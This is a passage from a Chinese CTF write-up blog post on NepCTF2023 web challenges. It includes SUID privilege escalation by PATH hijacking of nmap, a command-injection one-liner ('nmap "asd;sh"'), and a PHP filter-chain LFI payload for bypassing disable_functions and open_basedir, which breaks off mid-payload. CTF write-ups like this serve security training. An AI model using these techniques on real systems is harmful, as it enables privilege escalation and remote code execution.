<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>NepCTF2023 - mof's Blog</title><meta name=Description content="这是mof的博客"><meta property="og:title" content="NepCTF2023"><meta property="og:description" content="参考： NepCTF 2023 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com) 官方wp web ez_java_checkin 存在shiro反序列化漏洞，爆破密钥和利用链 flag只有写权限 suid提权，读取/flag 独步天下-转生"><meta property="og:type" content="article"><meta property="og:url" content="https://githubmof.github.io/nepctf2023/"><meta property="og:image" content="https://githubmof.github.io/images/w.ico"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-09T16:20:20+08:00"><meta property="article:modified_time" content="2024-04-23T05:09:53+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://githubmof.github.io/images/w.ico"><meta name=twitter:title content="NepCTF2023"><meta name=twitter:description content="参考： NepCTF 2023 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com) 官方wp web ez_java_checkin 存在shiro反序列化漏洞，爆破密钥和利用链 flag只有写权限 suid提权，读取/flag 独步天下-转生"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/images/w.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://githubmof.github.io/nepctf2023/><link rel=prev href=https://githubmof.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"NepCTF2023","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/githubmof.github.io\/nepctf2023\/"},"image":["https:\/\/githubmof.github.io\/static\/w.ico"],"genre":"posts","keywords":"ctf","wordcount":4861,"url":"https:\/\/githubmof.github.io\/nepctf2023\/","datePublished":"2023-09-09T16:20:20+08:00","dateModified":"2024-04-23T05:09:53+00:00","publisher":{"@type":"Organization","name":"mof","logo":"https:\/\/githubmof.github.io\/static\/w.ico"},"author":{"@type":"Person","name":"mof"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><a href=https://github.com/githubmof class=github-corner target=_blank title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="3.5rem" height="3.5rem" viewBox="0 0 250 250" style="fill:#70b7fd;color:#fff;position:absolute;top:0;border:0;left:0;transform:scale(-1,1)" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章
</a><a class=menu-item href=/tags/>标签
</a><a class=menu-item href=/categories/>分类</a><div class=dropdown><a href=javascript:void(0); class="menu-item menu-more dropbtn" title>游戏</a><div class="menu-more-content dropdown-content"><a href=/game/mikutap/ title target=_blank rel=noopener>mikutap </a><a href=/game/catch-the-cat/ title target=_blank rel=noopener>逮住那只猫!</a></div></div><a class=menu-item href=/about/>关于
</a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/ title>游戏</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NepCTF2023</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://github.com/githubmof title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>mof</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>ctf</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-09-09>2023-09-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 4861 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 10 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#web>web</a><ul><li><a href=#ez_java_checkin>ez_java_checkin</a></li><li><a href=#独步天下-转生成为镜花水月中的王者>独步天下-转生成为镜花水月中的王者</a></li><li><a href=#ez_include>Ez_include</a></li><li><a href=#post-crad-for-you>Post Crad For You</a></li></ul></li><li><a href=#crypto看>Crypto（看</a><ul><li><a href=#random_rsa>random_RSA</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#与ai共舞的哈夫曼><strong>与AI共舞的哈夫曼</strong></a></li><li><a href=#codes>codes</a></li><li><a href=#小丁弹钢琴>小丁弹钢琴</a></li><li><a href=#你也喜欢三月七么>你也喜欢三月七么</a></li><li><a href=#陌生的语言>陌生的语言</a></li><li><a href=#connectedfive>ConnectedFive</a></li></ul></li><li><a href=#pwn>PWN</a><ul><li><a href=#srop>srop</a></li><li><a href=#hrp-chat-1>HRP-CHAT-1</a></li><li><a href=#hrp-chat-3>HRP-CHAT-3</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>参考：</p><p><a href=https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/ target=_blank rel="noopener noreffer">NepCTF 2023 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com)</a></p><p><a href=https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh target=_blank rel="noopener noreffer">官方wp</a></p><h2 id=web>web</h2><h3 id=ez_java_checkin>ez_java_checkin</h3><p>存在shiro反序列化漏洞，爆破密钥和利用链</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png title=img></p><p>flag只有写权限</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png title=img></p><p>suid提权，读取/flag</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png title=img></p><h3 id=独步天下-转生成为镜花水月中的王者>独步天下-转生成为镜花水月中的王者</h3><p>suid提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f &gt; /tmp/out.txt
</span></span></code></pre></div><p>找到nmap有suid权限，直接执行nmap -V会报错，显示sh找不到对应文件，但是在/bin下找到了</p><p>查看源文件发现是bash，靶机环境没有bash，改为sh</p><p>参考：https://blog.csdn.net/weixin_57543652/article/details/128640321</p><p>环境变量注入，把自己的目录放到环境最前面，优先执行自己指定目录下面的文件，相当于dll劫持一样</p><p>直接在ports-alive的第二行写入cat /flag即可，执行下面的命令就可以拿flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>cat /flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取网段起始IP地址</span>
</span></span><span class=line><span class=cl>get_start_ip<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl><span class=nv>ip</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>subnet</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>IFS</span><span class=o>=</span><span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> -- <span class=nv>$ip</span>
</span></span><span class=line><span class=cl><span class=nv>oct1</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl><span class=nv>oct2</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl><span class=nv>oct3</span><span class=o>=</span><span class=nv>$3</span>
</span></span><span class=line><span class=cl><span class=nv>oct4</span><span class=o>=</span><span class=nv>$4</span>
</span></span><span class=line><span class=cl><span class=nv>start_oct4</span><span class=o>=</span><span class=k>$((</span> oct4 <span class=o>&amp;</span> subnet <span class=k>))</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$oct1</span><span class=s2>.</span><span class=nv>$oct2</span><span class=s2>.</span><span class=nv>$oct3</span><span class=s2>.</span><span class=nv>$start_oct4</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取网段结束IP地址</span>
</span></span><span class=line><span class=cl>get_end_ip<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl><span class=nv>ip</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>subnet</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>IFS</span><span class=o>=</span><span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> -- <span class=nv>$ip</span>
</span></span><span class=line><span class=cl><span class=nv>oct1</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl><span class=nv>oct2</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl><span class=nv>oct3</span><span class=o>=</span><span class=nv>$3</span>
</span></span><span class=line><span class=cl><span class=nv>oct4</span><span class=o>=</span><span class=nv>$4</span>
</span></span><span class=line><span class=cl><span class=nv>end_oct4</span><span class=o>=</span><span class=k>$((</span> <span class=o>(</span>oct4 <span class=o>&amp;</span> subnet<span class=o>)</span> <span class=o>|</span> <span class=o>(</span><span class=m>255</span> <span class=o>-</span> subnet<span class=o>)</span> <span class=k>))</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$oct1</span><span class=s2>.</span><span class=nv>$oct2</span><span class=s2>.</span><span class=nv>$oct3</span><span class=s2>.</span><span class=nv>$end_oct4</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将IPv4地址转换为长整型</span>
</span></span><span class=line><span class=cl>ip2long<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl><span class=nv>IFS</span><span class=o>=</span><span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> -- <span class=nv>$1</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=k>$((</span> <span class=o>(</span><span class=nv>$1</span><span class=s>&lt;&lt;24) + ($2&lt;&lt;16) + ($3&lt;&lt;8) + $4 ))
</span></span></span><span class=line><span class=cl><span class=s>}
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 将长整型转换为IPv4地址
</span></span></span><span class=line><span class=cl><span class=s>long2ip() {
</span></span></span><span class=line><span class=cl><span class=s>echo $(($1&gt;&gt;24</span><span class=k>))</span>.<span class=k>$((</span><span class=nv>$1</span>&gt;&gt;16<span class=o>&amp;</span><span class=m>255</span><span class=k>))</span>.<span class=k>$((</span><span class=nv>$1</span>&gt;&gt;8<span class=o>&amp;</span><span class=m>255</span><span class=k>))</span>.<span class=k>$((</span><span class=nv>$1</span><span class=o>&amp;</span><span class=m>255</span><span class=k>))</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查脚本是否以root身份运行</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=k>$(</span>id -u<span class=k>)</span><span class=s2>&#34;</span> !<span class=o>=</span> <span class=s2>&#34;0&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;此脚本需要以root权限运行&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查是否提供目标主机或目标网段作为脚本参数</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$#</span> -lt <span class=m>3</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;请提供目标主机或目标网段、起始端口和结束端口作为脚本参数&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 定义要扫描的目标主机或目标网段</span>
</span></span><span class=line><span class=cl><span class=nv>target</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl><span class=nv>start_port</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl><span class=nv>end_port</span><span class=o>=</span><span class=nv>$3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查目标是主机还是网段</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$target</span><span class=s2>&#34;</span> <span class=p>|</span> grep -q <span class=s2>&#34;/&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl><span class=c1># 目标是网段</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;扫描目标：</span><span class=nv>$target</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>target_ip</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$target</span><span class=s2>&#34;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f 1<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>subnet</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$target</span><span class=s2>&#34;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f 2<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>start_ip</span><span class=o>=</span><span class=k>$(</span>get_start_ip <span class=s2>&#34;</span><span class=nv>$target_ip</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$subnet</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>end_ip</span><span class=o>=</span><span class=k>$(</span>get_end_ip <span class=s2>&#34;</span><span class=nv>$target_ip</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$subnet</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;起始IP地址：</span><span class=nv>$start_ip</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;结束IP地址：</span><span class=nv>$end_ip</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 定义并行处理的最大并发数</span>
</span></span><span class=line><span class=cl><span class=nv>max_processes</span><span class=o>=</span><span class=m>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 进行端口扫描和存活检测</span>
</span></span><span class=line><span class=cl>seq <span class=s2>&#34;</span><span class=k>$(</span>ip2long <span class=s2>&#34;</span><span class=nv>$start_ip</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=k>$(</span>ip2long <span class=s2>&#34;</span><span class=nv>$end_ip</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span> <span class=p>|</span> <span class=k>while</span> <span class=nb>read</span> -r ip<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl><span class=nv>current_ip</span><span class=o>=</span><span class=k>$(</span>long2ip <span class=s2>&#34;</span><span class=nv>$ip</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> port in <span class=k>$(</span>seq <span class=s2>&#34;</span><span class=nv>$start_port</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$end_port</span><span class=s2>&#34;</span><span class=k>)</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl><span class=o>(</span>nc -z -w <span class=m>1</span> <span class=s2>&#34;</span><span class=nv>$current_ip</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$port</span><span class=s2>&#34;</span><span class=o>)</span> &gt;/tmp/tt 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;IP地址 </span><span class=nv>$current_ip</span><span class=s2> 的端口 </span><span class=nv>$port</span><span class=s2> 是开放的&#34;</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=c1># 限制并行处理的数量</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=k>$(</span><span class=nb>jobs</span> <span class=p>|</span> wc -l<span class=k>)</span> -ge <span class=s2>&#34;</span><span class=nv>$max_processes</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl><span class=nb>wait</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl><span class=nb>wait</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=c1># 目标是单个主机</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;扫描目标：</span><span class=nv>$target</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>target_ip</span><span class=o>=</span><span class=nv>$target</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 进行端口扫描和存活检测</span>
</span></span><span class=line><span class=cl><span class=k>for</span> port in <span class=k>$(</span>seq <span class=s2>&#34;</span><span class=nv>$start_port</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$end_port</span><span class=s2>&#34;</span><span class=k>)</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl><span class=o>(</span>nc -z -w <span class=m>1</span> <span class=s2>&#34;</span><span class=nv>$target_ip</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$port</span><span class=s2>&#34;</span><span class=o>)</span> &gt;/tmp/tt 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;IP地址 </span><span class=nv>$target_ip</span><span class=s2> 的端口 </span><span class=nv>$port</span><span class=s2> 是开放的&#34;</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>上传到靶机，<code>chmod</code>和<code>export</code>后执行<code>nmap -V</code>，得到flag</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png title=img></p><p>非预期：</p><p><a href=https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#%e7%8b%ac%e6%ad%a5%e5%a4%a9%e4%b8%8b-%e8%bd%ac%e7%94%9f%e6%88%90%e4%b8%ba%e9%95%9c%e8%8a%b1%e6%b0%b4%e6%9c%88%e4%b8%ad%e7%9a%84%e7%8e%8b%e8%80%85 target=_blank rel="noopener noreffer">NepCTF 2023 Web WriteUp | Boogiepop Doesn&rsquo;t Laugh (boogipop.com)</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap <span class=s2>&#34;asd;sh&#34;</span>
</span></span></code></pre></div><h3 id=ez_include>Ez_include</h3><p>/jump.php?hint</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$jump_link</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;link&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$jump_link</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=nv>$jump_link</span><span class=o>.</span> <span class=s2>&#34;.txt&#34;</span><span class=p>);</span> <span class=c1>// More info? See &#34;/var/www/html/hint.ini&#34; or &#34;./hint.ini&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl><span class=p>}</span>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hint&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hint&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$jump_link</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>所以到底来没来? 且看 /&lt;?php echo basename(__FILE__)?&gt;?hint
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></div><p>/hint.ini</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png title=img></p><p>主要是绕过<code>disable_functions</code>和<code>open_basedir</code></p><h4 id=filter-chain>filter chain</h4><p>参考：https://tttang.com/archive/1395/</p><p>利用<code>convert.iconv</code>编码转换构造马，问题是文件内容不能全为中文，需要提前处理一下</p><p>可以将filterchain base64编码；也可以对文本base64编码</p><p>工具：https://github.com/synacktiv/php_filter_chain_generator</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png title=img></p><p>这里用的是<code>--rawbase64</code>（上面脚本<code>--chain</code>有问题），所以生成的chain最后还要<code>convert.base64-decode</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/jump.php?link<span class=o>=</span>php://filter/convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM921.NAPLPS<span class=p>|</span>convert.iconv.855.CP936<span class=p>|</span>convert.iconv.IBM-932.UTF-8<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.iconv.UCS2.UTF-8<span class=p>|</span>convert.iconv.CSISOLATIN6.UCS-4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span 